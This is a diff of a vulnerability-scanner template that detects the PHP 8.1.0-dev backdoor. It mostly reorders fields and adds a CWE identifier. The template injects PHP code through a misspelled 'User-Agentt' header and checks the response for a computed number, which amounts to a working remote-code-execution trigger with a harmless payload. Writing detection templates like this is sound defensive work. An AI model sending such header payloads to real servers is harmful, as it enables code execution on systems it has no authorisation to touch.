@@ -1,5 +1,4 @@
 id: php-zerodium-backdoor-rce
-
 info:
   name: PHP 8.1.0-dev - Backdoor Remote Code Execution
   author: dhiyaneshDk
@@ -13,23 +12,19 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
-    cwe-id: CWE-77
+    cwe-id: CWE-77,CWE-94
   metadata:
     max-request: 1
-  tags: php,backdoor,rce,zerodium,vuln
-
+  tags: backdoor,php,rce,vuln,zerodium
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
-
-    headers:
+  - headers:
       User-Agentt: zerodiumvar_dump(233333*333332);
-
-    matchers-condition: and
     matchers:
-      - type: word
-        part: body
+      - part: body
+        type: word
         words:
-          - "int(77777355556)"
-
+          - int(77777355556)
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}'
